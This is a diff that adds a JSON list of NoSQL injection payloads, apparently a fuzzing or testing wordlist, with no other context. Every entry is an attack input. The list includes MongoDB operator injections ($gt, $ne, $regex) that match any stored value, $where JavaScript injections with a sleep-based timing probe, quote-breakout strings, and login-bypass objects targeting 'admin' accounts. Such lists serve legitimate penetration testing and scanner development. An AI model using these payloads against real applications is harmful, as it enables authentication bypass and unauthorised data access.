@@ -1,0 +1,41 @@
+[
+    {
+        "$gt": ""
+    },
+    {
+        "$ne": null
+    },
+    {
+        "$ne": ""
+    },
+    {
+        "$regex": ".*"
+    },
+    {
+        "$where": "this.password.length > 0"
+    },
+    {
+        "$or": [
+            {
+                "username": "admin"
+            },
+            {
+                "username": "administrator"
+            }
+        ]
+    },
+    "true, $where: '1 == 1'",
+    "'; return '' == '",
+    "'; return this.password.length > 0; var x='",
+    "{\"$gt\": \"\"}",
+    "{\"$ne\": 1}",
+    "{\"$nin\": []}",
+    "{\"email\": {\"$regex\": \".*\"}}",
+    "{\"$where\": \"sleep(5000)\"}",
+    "admin'||''=='",
+    "admin'||'1'=='1",
+    "{\"username\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}",
+    "{\"$and\": [{\"username\": \"admin\"}, {\"password\": {\"$ne\": \"\"}}]}",
+    "{\"username\": \"admin\", \"password\": {\"$regex\": \"^.*\"}}",
+    "{\"$or\": [{}, {\"username\": \"admin\"}]}"
+]
